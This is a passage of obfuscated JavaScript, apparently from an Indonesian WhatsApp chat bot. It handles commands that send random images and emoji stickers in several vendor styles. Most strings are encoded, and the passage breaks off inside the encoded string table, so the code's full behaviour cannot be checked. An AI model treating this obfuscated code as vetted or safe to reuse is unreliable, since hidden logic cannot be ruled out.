datax=fs[_0x1f7707(-0x2a9,0x4cb,0x106,0x4fe)+'nc'](_0x1f7707(0x30,-0x1ed,0x284,0x477)+_0x39f25f(0x50a,0x2ef,0xee,0xa3));jsonData=JSON['parse'](datax),randIndex=Math[_0x1f7707(0x449,-0x465,0xd,-0x477)](Math[_0x1f7707(-0x37e,0x1b0,-0x63,-0x4a3)]()*jsonData[_0x1f7707(0x30f,0x17e,0x4cc,0x94)]);let randKey_=jsonData[randIndex];Laki=await getBuffer(randKey_[_0x1f7707(0x430,0x2ab,0x244,0x6e0)]),await alpha['sendMessag'+'e'](from,Laki,image,{'caption':_0x1f7707(-0x1c8,0x164,-0x219,-0x578),'quoted':mek,'thumbnail':Buffer[_0x1f7707(-0x151,-0x4d4,-0xba,-0xd8)](0x18a*-0xf+-0x202b+0xb0d*0x5)}),Cewe=await getBuffer(randKey_[_0x39f25f(-0x1a0,-0x97,-0x51d,-0x512)]);const mediaxox=await alpha[_0x39f25f(-0x258,0xdb,-0x31b,-0x30a)+_0x39f25f(0x3e0,-0x8d,-0x43a,0x2d7)](from,Cewe,MessageType[_0x1f7707(0x2cd,0x18b,-0x15d,-0x554)],{'thumbnail':Buffer['alloc'](0x2503*-0x1+-0xe3*0x2+0x1*0x26c9)});let bacotluxxo=mediaxox[_0x39f25f(-0x1c5,-0xdc,0x1a5,-0x58d)][_0x1f7707(0xd3,-0x6a,0x427,0x66d)+_0x39f25f(0x3be,0x248,-0x10f,-0x157)]?mediaxox[_0x1f7707(0x12c,-0x605,-0x28a,-0x5e3)][_0x1f7707(0x779,0xf1,0x427,0x757)+_0x1f7707(0x357,0x7a,0x9a,0x403)]:mediaxox;const _0x394677={};_0x394677[_0x1f7707(-0x2c7,-0x4e3,-0x1ae,0x202)+'t']=_0x39f25f(-0x49a,-0x7b,-0x29e,-0x346);const _0x205575={};_0x205575[_0x1f7707(0x4cb,0xf,0x499,0x379)]=_0x1f7707(0x2bd,0x615,0x51d,0x54a),_0x205575[_0x1f7707(-0x240,-0x12f,0x1ce,0xf4)]=_0x394677,_0x205575[_0x39f25f(0x886,0x6ce,0x2c5,0xb84)]=0x1;const _0x54d09a={};_0x54d09a[_0x1f7707(0x15c,-0x2c1,-0x1ae,0x2f8)+'t']=_0x39f25f(0x7da,0x84c,0xc81,0xa46);const _0x3bee60={};_0x3bee60[_0x39f25f(0x36a,0x647,0x732,0xa06)]=''+command,_0x3bee60['buttonText']=_0x54d09a,_0x3bee60[_0x1f7707(0xcd,0x9e,0x520,0x70c)]=0x1;const buttonsxox=[_0x205575,_0x3bee60],btnxo___={'contentText':'*Cewe*','footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x1f7707(0x26d,0xee,0x99,-0x351)+_0x1f7707(0x3a8,0x32e,0xf2,0x1f8))+sender['split']('@')[0x8ba+0x751*0x3+-0x1ead*0x1],'buttons':buttonsxox,'headerType':0x4,'imageMessage':bacotluxxo[_0x1f7707(-0x366,0xc9,-0x28a,-0x4e3)][_0x39f25f(0x2a6,-0x4d,-0x221,-0x2b1)+'ge']},_0x3b22fb={};_0x3b22fb[_0x1f7707(0x32e,-0xfa,-0xa8,0x3e1)]=mek,alpha[_0x39f25f(-0x3a,-0x84,0x1e7,-0x3d2)+'e'](from,btnxo___,MessageType[_0x1f7707(-0x18d,-0x164,0x65,0x4ff)+'sage'],_0x3b22fb)['catch'](_0x238564=>{function _0x5dd9b1(_0x3a2d17,_0x47e807,_0x44bce5,_0x2e6297){return _0x1f7707(_0x3a2d17-0x14c,_0x44bce5,_0x2e6297-0x665,_0x2e6297-0x51);}const _0x4ba7c5={};_0x4ba7c5[_0x5dd9b1(0x259,0x371,0x6cd,0x489)]=_0x483c5a(0x9e2,0x821,0x603,0xb7c)+_0x5dd9b1(0xabe,0x95e,0xa1e,0x61f)+'oba\x20bebera'+_0x5dd9b1(0x9d4,0x7ba,0x3e2,0x7ab)+'gi';function _0x483c5a(_0x1d89b4,_0x4f5f66,_0x2329d3,_0x360f31){return _0x39f25f(_0x360f31,_0x4f5f66-0x37a,_0x2329d3-0xe,_0x360f31-0x17d);}const _0x29a4e9=_0x4ba7c5;reply(_0x29a4e9[_0x5dd9b1(0x3da,0x4f4,0x5f9,0x489)]);});break;case _0x1f7707(0x6ad,0x64c,0x454,0x4b9):case _0x1f7707(-0x263,-0x29e,-0x1a2,-0x46c):if(!q)return reply(_0x39f25f(0xc24,0x7a1,0x441,0xa94));qes=args[_0x1f7707(-0x6d,0x3da,0x2bf,0x31c)]('\x20');const _0x226d45={};_0x226d45[_0x39f25f(0x284,-0x118,-0x27d,0x392)]=_0x1f7707(0x11d,0x1c4,-0x252,-0x203)+'e-'+qes,_0x226d45[_0x39f25f(0x14d,0x144,-0x202,0x202)+'n']=''+creator,_0x226d45[_0x39f25f(0x1b7,0x1c8,0x2a7,0x64a)]=''+qes;const _0x4b28c8={};_0x4b28c8[_0x39f25f(-0xfd,-0x118,0x181,-0x2fc)]=_0x39f25f(-0x168,-0xfa,-0x60,-0x533)+_0x39f25f(0x390,0x37,0xc2,-0x437)+qes,_0x4b28c8[_0x1f7707(-0x1ee,-0x305,-0x6a,-0x372)+'n']=''+creator,_0x4b28c8[_0x39f25f(0x4bf,0x1c8,0x3fa,0x283)]=''+qes;const _0x17ec7f={};_0x17ec7f[_0x1f7707(-0x447,-0x3fa,-0x2c6,0xb)]=_0x1f7707(0x254,0xed,-0x88,-0x46d)+_0x39f25f(0x57f,0x397,-0xcb,0x41e)+qes,_0x17ec7f[_0x39f25f(-0xca,0x144,-0x2db,-0x4e)+'n']=''+creator,_0x17ec7f['rowId']=''+qes;const _0x48934a={};_0x48934a[_0x1f7707(0x1a7,-0x3e0,-0x2c6,-0x70)]=_0x39f25f(0x2aa,0x49f,0x917,0x6cc)+_0x1f7707(0x2e4,0x201,0x1e8,-0x2bf)+qes,_0x48934a[_0x39f25f(-0x1de,0x144,-0x224,-0x36c)+'n']=''+creator,_0x48934a[_0x1f7707(0x2b5,-0x107,0x1a,-0x32a)]=''+qes;const _0x348da6={};_0x348da6[_0x1f7707(-0x46,-0x2fc,-0x2c6,0x69)]='Emoji-What'+_0x1f7707(0x6e9,0x50b,0x503,0x9b9)+qes,_0x348da6[_0x1f7707(-0x264,-0x339,-0x6a,-0x9)+'n']=''+creator,_0x348da6[_0x39f25f(0x4b1,0x1c8,0x7e,-0x195)]=''+qes;const _0x2bb663={};_0x2bb663[_0x1f7707(-0x6a2,-0xad,-0x2c6,-0x2c6)]=_0x1f7707(-0x128,-0xaf,0x156,-0x140)+_0x39f25f(-0x97,0x85,-0x64,0x159)+qes,_0x2bb663['descriptio'+'n']=''+creator,_0x2bb663['rowId']=''+qes;const _0x3ab061={};_0x3ab061[_0x39f25f(-0x3a0,-0x118,-0x133,-0x1fa)]=_0x39f25f(0x764,0x7e1,0xb8a,0x900)+_0x39f25f(0x3b3,0x1b4,0xec,-0x84)+qes,_0x3ab061['descriptio'+'n']=''+creator,_0x3ab061[_0x1f7707(0x2e,0x25a,0x1a,0x79)]=''+qes;const _0x1052b3={};_0x1052b3[_0x1f7707(-0x52a,0x2b,-0x2c6,-0x411)]=_0x39f25f(0x6c2,0x303,0xb9,0x49b)+'ixels-'+qes,_0x1052b3['descriptio'+'n']=''+creator,_0x1052b3[_0x39f25f(0x407,0x1c8,-0x1c5,0x120)]=''+qes;const _0x51b943={};_0x51b943[_0x1f7707(-0x1fa,-0x17e,-0x2c6,-0x3ee)]=_0x39f25f(-0x1af,0x20e,-0x1e8,0x93)+_0x39f25f(0x7dd,0x801,0x485,0xb4c)+qes,_0x51b943['descriptio'+'n']=''+creator,_0x51b943[_0x39f25f(0x41b,0x1c8,-0xe9,0x8b)]=''+qes;const _0x2c6daa={};_0x2c6daa[_0x1f7707(-0x403,-0x2b4,-0x2c6,-0x1e)]=_0x39f25f(0x33d,-0xe9,-0x54b,0x31f)+_0x39f25f(0xa95,0x6b4,0x808,0x484)+qes,_0x2c6daa[_0x1f7707(-0x26,-0xb,-0x6a,-0x3b)+'n']=''+creator,_0x2c6daa[_0x39f25f(-0x10b,0x1c8,0x460,-0x16c)]=''+qes;const _0x20f95f={};_0x20f95f[_0x1f7707(-0x8a,-0x3df,-0x2c6,-0x54b)]=_0x1f7707(-0x90,0x426,0x42d,0x2ce)+_0x39f25f(0x591,0x6c6,0x4dd,0x3eb)+qes,_0x20f95f[_0x1f7707(-0x501,-0xd4,-0x6a,0x3e9)+'n']=''+creator,_0x20f95f[_0x1f7707(0x27,0x26c,0x1a,0x7a)]=''+qes;const _0x18d6d2={};_0x18d6d2[_0x39f25f(-0x175,-0x118,-0x1cf,0x1e4)]='Emoji-LG-'+qes,_0x18d6d2['descriptio'+'n']=''+creator,_0x18d6d2[_0x39f25f(-0x1f2,0x1c8,0x1a5,0xcc)]=''+qes;const _0x33d09a={};_0x33d09a['title']=_0x39f25f(0xaec,0x744,0x588,0x3db)+qes,_0x33d09a['descriptio'+'n']=''+creator,_0x33d09a[_0x39f25f(0x5dd,0x1c8,0x5ae,-0x77)]=''+qes;const rows12=[_0x226d45,_0x4b28c8,_0x17ec7f,_0x48934a,_0x348da6,_0x2bb663,_0x3ab061,_0x1052b3,_0x51b943,_0x2c6daa,_0x20f95f,_0x18d6d2,_0x33d09a],_0x1e5135={};_0x1e5135[_0x1f7707(-0x1f6,-0x6fa,-0x2c6,-0x56)]=_0x39f25f(0x1fb,0x311,0x5f,0x36e)+'h\x20satu',_0x1e5135['rows']=rows12;const sections12=[_0x1e5135],listt12={'buttonText':'SELECT\x20HER'+'E','title':_0x1f7707(-0x1b8,-0x1df,-0x123,0x2dc)+'\x20','description':'Hai\x20@'+sender[_0x39f25f(0x38b,0x3bc,0x4f8,0x3db)]('@')[0x1891+0xd7*0x11+-0x71*0x58]+('\x20Semoga\x20ha'+'rimu\x20menye'+_0x1f7707(0x63b,0x127,0x383,0x20b)+_0x1f7707(-0x6d,-0x19b,0x2fc,0x57c)+_0x39f25f(0x37,0x1ea,0x247,0x526)+'ji\x20silahka'+_0x39f25f(0x2e7,0x586,0x7a7,0x624)),'footerText':''+tampilTanggal+enter+tampilWaktu,'sections':sections12,'listType':0x1},_0x22edd3={};_0x22edd3[_0x39f25f(0x3ae,0x63f,0x37d,0x701)+'id']=[sender];const _0x414de2={};_0x414de2['quoted']=ftoko,_0x414de2[_0x39f25f(0xb4f,0x6dd,0xb53,0x25c)+'o']=_0x22edd3,alpha[_0x39f25f(0x3b,-0x84,-0x382,0x16c)+'e'](from,listt12,MessageType[_0x1f7707(0x70b,0x6c8,0x456,0x30c)+'e'],_0x414de2);break;}function _0x3a08(_0x2923c2,_0x2e7724){const _0x28a103=_0x1139();return _0x3a08=function(_0x3ea59d,_0x18e9ae){_0x3ea59d=_0x3ea59d-(0x1999+0x24*-0xe2+0x71e);let _0x350260=_0x28a103[_0x3ea59d];if(_0x3a08['ipELdA']===undefined){var _0x54d666=function(_0x1c5cff){const _0x4ad7bd='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2e5e36='',_0xf1fc4d='';for(let _0x296a89=-0x1ad5+-0x1fc8+0x3a9d,_0x1b6088,_0x3b214a,_0x3a180a=0x4d0+-0x155a+-0x2*-0x845;_0x3b214a=_0x1c5cff['charAt'](_0x3a180a++);~_0x3b214a&&(_0x1b6088=_0x296a89%(-0x25e7+-0x861+-0x2*-0x1726)?_0x1b6088*(-0x20*0xe2+-0xec+-0x1c*-0x10d)+_0x3b214a:_0x3b214a,_0x296a89++%(0x36*-0xab+0x316*0x1+0x58*0x60))?_0x2e5e36+=String['fromCharCode'](0x8dd+-0x1*-0x8+-0x7e6&_0x1b6088>>(-(0x1*0x28+-0x6e*-0x7+-0x328)*_0x296a89&-0x2*0x833+-0x13+-0x107f*-0x1)):-0x2a8+-0xd5a+0x1002){_0x3b214a=_0x4ad7bd['indexOf'](_0x3b214a);}for(let _0x1beef7=-0x2262+-0x1*-0x7dc+0x1a86,_0x33b831=_0x2e5e36['length'];_0x1beef7<_0x33b831;_0x1beef7++){_0xf1fc4d+='%'+('00'+_0x2e5e36['charCodeAt'](_0x1beef7)['toString'](-0x9b7*0x1+-0x2256+-0x1eb*-0x17))['slice'](-(0xb6a+-0x29*-0xc1+-0x2a51));}return decodeURIComponent(_0xf1fc4d);};_0x3a08['iBlbkL']=_0x54d666,_0x2923c2=arguments,_0x3a08['ipELdA']=!![];}const _0x5bed7d=_0x28a103[0x4*-0xb8+0x1acd+-0x17ed],_0x59970b=_0x3ea59d+_0x5bed7d,_0xc68920=_0x2923c2[_0x59970b];return!_0xc68920?(_0x350260=_0x3a08['iBlbkL'](_0x350260),_0x2923c2[_0x59970b]=_0x350260):_0x350260=_0xc68920,_0x350260;},_0x3a08(_0x2923c2,_0x2e7724);}sub_yt_zeeone_ofc==_0x39f25f(0x3db,-0xa4,-0x33a,-0x4a9)+'e-'+q5&&(reply(lang[_0x39f25f(-0x171,0x22a,0x571,0x3dd)]()),emoji[_0x1f7707(0x4ad,0x2f3,0xda,-0xcf)](''+q5)[_0x1f7707(0x36f,0x505,0x234,-0x2a)](_0x3e4792=>{teks=''+_0x3e4792[_0x5d78ef(0xad2,0x933,0xca6,0xc9e)][0x2309+-0x21ff+-0x7*0x26][_0x255a24(0x965,0xa7c,0xb36,0x6da)];function _0x5d78ef(_0x2d2f3e,_0x4fd75a,_0xa009d2,_0x13634a){return _0x39f25f(_0x2d2f3e,_0x13634a-0x49b,_0xa009d2-0x17f,_0x13634a-0xca);}console[_0x5d78ef(0xba5,0x5a6,0x8a4,0xa3a)](teks);function _0x255a24(_0x321cd6,_0x4692bd,_0xfa40e9,_0x233d85){return _0x1f7707(_0x321cd6-0xdf,_0x321cd6,_0x233d85-0x546,_0x233d85-0x125);}sendStickerFromUrl(from,''+teks);}));sub_yt_zeeone_ofc==_0x1f7707(-0x1bc,-0x2f4,-0x2a8,0x1a4)+_0x1f7707(-0x33c,-0x273,-0x177,0x112)+q5&&emoji[_0x1f7707(0x1d3,0x426,0xda,0x455)](''+q5)[_0x39f25f(0x8d,0x3e2,0x502,0x574)](_0x261521=>{function _0x382b8d(_0x2f88f8,_0x573571,_0x3ae57a,_0xb4bc1c){return _0x39f25f(_0x3ae57a,_0x2f88f8-0x412,_0x3ae57a-0x14,_0xb4bc1c-0x11a);}const _0x638da2={'olXRE':function(_0x4e7ddd,_0xfc93c,_0x1a8279){return _0x4e7ddd(_0xfc93c,_0x1a8279);}};teks=''+_0x261521[_0x382b8d(0xc15,0x1070,0xff1,0xac1)][0x1daf*-0x1+0x978*-0x1+0x2728][_0x3ecd98(-0xb8,0x3ce,-0x190,0x2b1)];function _0x3ecd98(_0x396a4d,_0x3c1c22,_0x5cc270,_0x3135a3){return _0x39f25f(_0x5cc270,_0x3135a3- -0x91,_0x5cc270-0x1b1,_0x3135a3-0x185);}console[_0x382b8d(0x9b1,0xacf,0x836,0xb6b)](teks),_0x638da2[_0x3ecd98(-0x3bf,0x238,0x13d,0xd2)](sendStickerFromUrl,from,''+teks);});sub_yt_zeeone_ofc=='Emoji-Sams'+_0x39f25f(0x408,0x397,0x2de,0x686)+q5&&(reply(lang[_0x1f7707(0x30,0x4f0,0x7c,0x66)]()),emoji[_0x39f25f(0x52b,0x288,0x48f,0x192)](''+q5)[_0x39f25f(0x741,0x3e2,0x803,0x776)](_0x4d651b=>{function _0x196d3d(_0x5c4493,_0x5b6641,_0x4d5d88,_0x3cb885){return _0x39f25f(_0x5c4493,_0x4d5d88- -0x68,_0x4d5d88-0xfe,_0x3cb885-0xde);}function _0x5d65ba(_0x26a5b4,_0x50b349,_0x39cac7,_0x30011a){return _0x1f7707(_0x26a5b4-0x133,_0x50b349,_0x39cac7-0x761,_0x30011a-0x8f);}const _0x24e770={'rOTEN':function(_0x4c4f3d,_0x34ea45,_0x353b3b){return _0x4c4f3d(_0x34ea45,_0x353b3b);}};teks=''+_0x4d651b[_0x196d3d(0x51d,0x492,0x79b,0x2f3)][-0x2*-0xdff+0x1*0x2033+0x1f*-0x1f1]['url'],console['log'](teks),_0x24e770[_0x5d65ba(0x910,0x183,0x5e9,0x1db)](sendStickerFromUrl,from,''+teks);}));sub_yt_zeeone_ofc==_0x39f25f(0x3cd,0x49f,0x312,0x65f)+_0x39f25f(0x4d1,0x396,0x4fb,0x785)+q5&&emoji[_0x1f7707(-0x171,-0x2ec,0xda,-0x386)](''+q5)['then'](_0x558024=>{function _0x4a0429(_0xc8a2c1,_0x23e031,_0x2766d7,_0x4ede64){return _0x39f25f(_0x4ede64,_0x23e031-0x319,_0x2766d7-0x164,_0x4ede64-0x1a4);}teks=''+_0x558024['images'][-0x5d*-0x2f+-0x70*-0x28+-0x2290][_0x4a0429(0x243,0x65b,0x529,0x535)];function _0x2f4097(_0x56e961,_0x1c3799,_0xf38349,_0x27a62a){return _0x1f7707(_0x56e961-0x1c,_0x1c3799,_0x56e961-0x40b,_0x27a62a-0x10e);}console[_0x4a0429(0xb77,0x8b8,0x6e0,0x94f)](teks),sendStickerFromUrl(from,''+teks);});sub_yt_zeeone_ofc=='Emoji-What'+_0x1f7707(0x4fe,0x11c,0x503,0x57b)+q5&&(reply(lang[_0x39f25f(0x44f,0x22a,-0x117,0x1fd)]()),emoji[_0x39f25f(0x666,0x288,0x6dc,0x3fb)](''+q5)[_0x1f7707(0x254,-0x198,0x234,-0x2)](_0x3fa331=>{function _0x486f9c(_0x4b155c,_0x45208d,_0x4a53ac,_0x423001){return _0x39f25f(_0x423001,_0x45208d-0x366,_0x4a53ac-0x1ed,_0x423001-0x20);}const _0x2a4bb6={'IdWJk':function(_0x4c6e66,_0x3a54de,_0xa228d1){return _0x4c6e66(_0x3a54de,_0xa228d1);}};teks=''+_0x3fa331[_0x1ef21e(0xbb9,0x989,0x1124,0xddd)][-0x20e6+0x955+0x1795][_0x486f9c(0x6db,0x6a8,0x68c,0x980)];function _0x1ef21e(_0x87e2db,_0x18289a,_0x33aceb,_0x4d2f62){return _0x39f25f(_0x87e2db,_0x4d2f62-0x5da,_0x33aceb-0x9f,_0x4d2f62-0x66);}console[_0x1ef21e(0x8f5,0xe8f,0xa49,0xb79)](teks),_0x2a4bb6[_0x1ef21e(0xd79,0x68a,0x859,0xa16)](sendStickerFromUrl,from,''+teks);}));sub_yt_zeeone_ofc==_0x1f7707(0x19f,0x4f9,0x156,-0x244)+'ter-'+q5&&emoji[_0x1f7707(-0x246,0x490,0xda,-0x322)](''+q5)[_0x1f7707(0x2cc,0x666,0x234,0x5b6)](_0x4c2517=>{teks=''+_0x4c2517[_0x3001c4(0xdd2,0xe15,0xa6c,0xf84)][-0x1862+-0x1c5c+-0x34c3*-0x1][_0x3001c4(0x911,0xa3a,0x58b,0x709)];function _0x3001c4(_0x244c8a,_0x4b4d9e,_0xa6c07,_0x36f45e){return _0x1f7707(_0x244c8a-0x145,_0x36f45e,_0x244c8a-0x77d,_0x36f45e-0x6d);}console[_0x15d02f(0x699,0x3ba,0x416,0x7fd)](teks);function _0x15d02f(_0x1576f6,_0x7916f,_0x17c1ab,_0x30d9b5){return _0x1f7707(_0x1576f6-0x57,_0x17c1ab,_0x30d9b5-0x40c,_0x30d9b5-0x1bd);}sendStickerFromUrl(from,''+teks);});sub_yt_zeeone_ofc==_0x39f25f(0x663,0x7e1,0x98e,0x81f)+_0x1f7707(-0x1cf,0x29a,0x6,0x44)+q5&&(reply(lang[_0x1f7707(-0x2e,0x286,0x7c,0x322)]()),emoji['get'](''+q5)['then'](_0x34c405=>{teks=''+_0x34c405['images'][0x237d+-0x71*0x37+-0x8*0x166][_0x45a612(0x755,0x62f,0x789,0xa4b)],console['log'](teks);function _0x45a612(_0x486909,_0x52a2aa,_0x583367,_0x3b7662){return _0x1f7707(_0x486909-0x1f1,_0x3b7662,_0x583367-0x5f5,_0x3b7662-0xff);}sendStickerFromUrl(from,''+teks);}));sub_yt_zeeone_ofc==_0x1f7707(0x390,0x2b8,0x155,0x45b)+_0x39f25f(0x497,0x519,0x95c,0x1a3)+q5&&emoji['get'](''+q5)[_0x1f7707(-0x265,-0x22f,0x234,0x5a8)](_0x7db3bf=>{teks=''+_0x7db3bf['images'][0x5*-0x753+0xf47+0x155f][_0x24234f(0x957,0x8a9,0xadd,0x940)],console['log'](teks);function _0x24234f(_0x9a958f,_0x21540,_0x21a8f4,_0x2f3e93){return _0x1f7707(_0x9a958f-0x98,_0x21540,_0x2f3e93-0x7ac,_0x2f3e93-0x12);}sendStickerFromUrl(from,''+teks);});function _0x1139(){const _0x5ef28e=['yxn1A2fUigT1Ba','sKXUB0i','C2vJB25KCW','Ahr0Chm6lY93DW','mZu5ntmXote1oq','ihrHCgKGDgLKyq','AcbTzw1IzxjPia','zgvSAxzLCMLLCW','DwfUigrHBIbTzq','yxbPig9Yyw5Nia','igfKysbKyxjHAa','BgvUz3rO','A2f0ywLSAgfT','AMfWyw4','BwfUzYbTyw1WDq','ygbG','8j+tJsbxywT0Dsa6ia','EgHqvNG','t1vqie9qru4G','4OcCs2vZDwTZzxnH','yxn1CgfUig1LBG','yw4GyNv0Dg9Uia','lcbTzxrVzguGEq','8j+tMYaQvxnLCM5HBq','DhrWmW','C2vUzevWAgvTzq','y2fWDgLVBIWGyq','ywSGDgf3ysbHAW','lYbcyxLHCGOZlG','pZ8GkKXPBMSQia','Ete4','AwTHiefUzgeGAq','Axr1ihrPzgfRia','BMCGzgfUig1LCG','4PIG77Ipie93BMvYia','CgfKysbIyw55yq','z3j1CcbIB3q','CgfUDgLLCW','BNrHAw11lG','Aw5ZDgf2Awq','uhvYysbWDxjHia','q0fuquXprW','wXTBmtSZmM0GqW','BwvUy2LUDgfPlG','zd9Uyw1Lpq','l3bFmJaZmJv5Ca','qvKGtvvtsum','ysbHCgeTyxbHlG','yM90p/cFPjqGqM9VBG','sg1TlcbIyw5Uzq','ywrHihnLBgfSDq','mtSZn20+','sgf5iea','ihLHBMCGy2vYza','yw5HpYa','yMfUEwfRlUkaNsaO','yw4GC2vUExvTyq','ysWGBwfRysbbBG','BMv0l3yYlZ9SyW','kVcFLjCGtgLUAYa6kG','C2fNzsboB21VCG','rM9rtfy','Ahr0Chm6lY9JlG','CgvYBMfOihn1AW','yNHxC1a','zw50zwqGAw4GDa','C0fWCc0','qxbHA2fOihrHAW','C29SB2C','AwrLEc0','y3vT','zxjVBG','44cfifnPEMuGoG','8j+qUsbnzw51igTLlq','BIWGA2fSyxuGAW','zM9YD2fYzgLUzW','tYakcLbVD2vYzq','sgKGqa','DsbIAwXHBMCGyG','u2nHBIbcyxjJBW','lIbtzwjHyIbQAq','ifnLy29UzcO','z1P2Eee','Aw5ZDgfWAg90BW','ufiTA3uGywrHBa','Bsb0zxjKywz0yq','sfaTBxuUcJiUia','zw5NzxiT','DhrTBvO','CgfPihr1ys7IGj0','jMfWAwTLEt1Oyq','yw4SigrHBIbPBq','B3DUzxi','yxrH','zw5KAxjP','DhLWzq','EweU','s1jpEKO','zwXHAYb0yxDHia','8j+uOIboB21VCG','Ewf0','t3jHBMCGA2f5yq','BMCGywTHBIbRyq','zwXHAMfYyw4GCW','qJm5mtGZn0e1oa','BM90zwTZ','yw5NigXHAw4U','DuTftfq','z2v0AwSGzgKGzW','ysbTzw1IDwf0Bq','y29UDgv4DeLUzG','4OcCs2vNywDHBgfU','Agf0Asb5yw5Nia','cGPFrM9YihrOzq','BwfNzw50yq','igTHBxuGChv0Dq','uu10rKy','CgeGA2L0ysbZAq','Awj1ihbLBMDLBq','uc1TDs4kmI4Gua','zgfRigXHA3uSia','yxuGBxvUz2TPBG','BhvOyw4','zNv0yw5HCMK','zgLUB19RDw5PBG','A2f3yw5FC3bVBG','zw1WDxjUysWGAG','sNH6Avi','DhvUz2THBIbKyq','rhLuAgq','yu9zzNi','zwTVBgfOigfWyq','ihbLA2vYAMfHBG','yEkaPK1HC2LOigfK','zgfUig1LBxvRyq','ChvZC3LFANbN','lMjLlY04Ahb6sW','C2fNzuzYB21dBW','y2f0y2G','ig11BMDRAw4Uia','lcbRyw11ig1HDq','nsbQyw0','qwT1igDHAYbWyq','zxXYzwr8D2HPDa','igzHBhnLiaPJBW','ieTHCMvUysb5yq','DgH1BwjUywLS','zYb5yw5NihbLCG','zYbRCMvHDgLMia','lcbtzxrLBgfOia','ywSGB3jHBMC/ia','BMrHCgf0A2fUia','ihrV','BMvUzwSGBw95yq','z2fYigPHzgKGuW','Dgv4Dd0','lIboyw11BIWGAG','ywT1A2fUigfWyq','ig9Yyw5NigXHAq','DcbZzwHHCMLHBG','DxnLCIbWCML2yq','8j+sJIbzB3uGD2fUDa','C2nYAwjLigH0Da','4OcCv2fUAxrHignH','DxbWB3j0','zMTRDvK','Ahr0Chm6lY9Uzq','yMvYz2vYywSU','otK5lNDLyNa','44cmicPjtLnuquDs','BMD1BMDRyw5Syq','qxnPys9kywTHCG','z2uGyw5PBwvTzq','ig1HC2eGzgvWyq','zcbIEsba','Dw5KzwzPBMvK','lcbZDxbHEweGCW','CxvVDgvZBwvUDq','yw4kns4Gu2vSzq','zhPwqve','DMLKzw9Z','ywrHBgfOigT1yG','Ew91DhvIzs5JBW','u1rdiennrcbqta','BMvYsMLK','DxrHBIbZzxn1yq','zw42oa','A2LYAw0GDM9PyW','ysbHDgf1ihbHAW','BweGBwvUy2LUDa','B2z1qu8','C3zzBvu','A2vPBMDPBMfUia','yxiGA2fTDt8','idmGAgfYAq','ig5VBMeGy2fUDa','yxuGDgLRDg9Ria','vvne','qK9u','Aw5WDxrgB3jTyq','zgfYihrPzgfRia','yMfuteS','Dxr1lMjLlZfYxW','rgLRigPHBMDHBG','ywrPigT1C2LYia','Ahr0Chm6lY9HCa','DgLVBG','AsbRzwTHEwfHBG','Bwf1BMCSigTLCG','igjPC2eGBwvYyq','EweUifLHBMCGCW','BwvUz2HHzgfWAq','Cgf0CMLJAW','rw1VAMKTsfrdlq','ysbZzwTHBxb1BG','DgHvAMi','yw5NihLHBMCGyG','ifrLDgfWAsbQyq','igfRDw4GA2fTDq','BwLRB3nPyMe','8j+QGcbbtfbiqujpva','A0D3D0e','ihLHAxr1ihbHCW','ChaUBMv0','D2fPDezVCKfJAW','vKvssuzz','y0X4twG','cGOk4OcIpIboyw1H','igrVBMfZAsb2Aq','C2z3lW','ugLSAwGGugf5ia','D258y3LHBNXKyq','yw5HmtG','zgjMBhK','Ahr0Chm6lY9LlG','Dhf0BW','nJzUt3DwAKu','jMnMpwzHBhnLjG','nJi4mZeZnJuWnq','ihbLCMnHEweGza','BxuGAMf0DwGGAW','zM9VDa','AwySigPHDwGGBa','DgfUihrLCMjLCW','yxnPigXLyMLOia','kdmYmcXPDYKNoG','BhuGC2LOig5HBq','ywfUlG','qvvesu8','D2vICa','A2vIB2HVBMDHBG','ysWGBMfTDw4GBq','4PYtie9xtKvs','su5rvuLswq','DhvHihnHEweSia','yw5HBIWGDgfWAq','yw4GDgvYA3vHDa','C2fUDhv5','z2fSyw55ysbIyq','BwLZA2LUihrPza','CMjLBgfSywSGyq','ufvcteLdic0Gtq','8j+sTsbhB3bHEq','uMfTzwLUigTHAW','qMfNAwT1lcblyq','y2fSBcb3Agf0CW','yMfLA2H5Dw5N','zhjVCcbLBw90ia','ig5PAcb2AwrLBW','ig5PBMDNywXPBG','Dxr1Cc4','igfRyxiGDw50Dq','yw1VBMD1CW','nJy2lNDLyNa','A2fUigjLCMfRAq','ig1LBMDLCNrPia','Ahr0Chm6lY9OlG','yMfSAwSGA2vWyq','zxbHzgfUEweUlG','ywTRyw4GzgLYAq','u3vWCg9YDcbArq','lMHLCM9RDwfWCa','BIbcB3qH','ogjHBgW','B3DUzxjTzw51','zwXPBIdGSQdVUlxGSQa','icPsrufekG','EKvIBMe','A2vWywrHiefSBa','kVcFKQiGvg90ywWGoG','BIbKyw4GBgvTCa','weXnzLi','rMLUAxnO','DMLKzw9jza','4OcCugfRywLHBIbP','DxnLihrOzsbHCW','y29WEu5gB3j3yq','vxnLCM5HBwvUEq','DhrKB3DUBg9Hza','zMvLDa','BwfSyxLZAwe','igH0DhbZoI8VAq','CxvVDgvKtq','zw5Nyw4GAgfYDa','ywrPihvKywGGCa','A2LTBwLUC2vVAW','zw1VAMLUEwe/','igTLigrLCgfUlG','DcbTzwrPysbHAW','qxbHyMLSysbZzq','yNv0Dg9UC1jLCW','BNr1AYbIywHHzW','ideTosbezxrPAW','zw5HigfRDsbZyq','igHHCMDHBNLHia','A2LTDgfLAhL1BG','A2eGA2fTDsbTyq','yMf5yxjFzgfUyq','yw4GzgfYAsbRzq','re9dvu1ftLq','igTHBxuUiefRDq','BNrLBNq','C3qGBwvUDsbIBW','ywDL','BNLHig9Yyw5Nlq','z2uGzg93BMXVyq','4OcCq2fYAwXHAcbP','ChrF','yM9KB2GGzgfYAq','C2L6zq','BwvTyMvUy2KGza','qwT1igjPC2eGCW','igj1DhvOigjLyG','zYb5yw5NihbHBa','Aw5N','BfbMD0O','BZDZDJrODtrRlq','thuGC2LHCgeGAG','ywGGCgLUAMfTyq','zw5NA2f1igjLCG','yM9KEq','Cg9Rzq','BgfJv3C','CgXHEw1Wna','CMvWBhKGBwvZCW','BMDPzG','BxuGyMvSDw0GCW','Ahr0Chm6lY95BW','mY0XmZi4mJCYmW','C3vKywGGDgvYDa','z2uGC291CMnLia','ChjPy2vbBw91BG','A2vSAwHHDgfUia','DgvRihLHBMCGCa','Dcb5yw5NigT1yq','ywHLz2fV','DxnLihrOzsbMDq','yvvunvDTwvy','A2LYigPHBgfUia','ywSGDgfRDxqGBq','u2vKzxjOyw5Hia','C2fSywHHBIbHDa','CMvNAxn0zxiGBW','y2HHD